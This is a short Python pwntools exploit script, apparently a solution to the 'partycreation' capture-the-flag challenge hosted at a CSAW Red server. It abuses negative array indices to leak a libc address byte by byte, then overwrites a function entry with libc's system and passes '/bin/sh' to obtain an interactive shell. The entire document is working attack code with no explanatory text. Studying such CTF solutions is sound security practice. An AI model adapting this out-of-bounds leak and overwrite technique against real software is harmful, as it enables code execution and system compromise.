from pwn import *

e = ELF("./partycreation")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.red.csaw.io", 5010)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

p.sendlineafter(">", "2")
p.sendlineafter(">", "-2")

p.recvuntil("Name:")
leak = 0
for i in range(7):
  p.recvuntil(":")
  curr = (int(p.recvline()) + 0x100) % 0x100
  leak += curr * 0x100**i

leak -= libc.symbols["_IO_2_1_stdout_"]

print(hex(leak))


p.sendlineafter(">", "3")
p.sendlineafter(">", "0")
p.sendlineafter(">", "/bin/sh")

p.sendlineafter(">", "3")
p.sendlineafter(">", "-4")
p.sendlineafter(">", p64(leak + libc.symbols["system"]))

p.sendlineafter(">", "/bin/sh")

debug()


p.interactive()
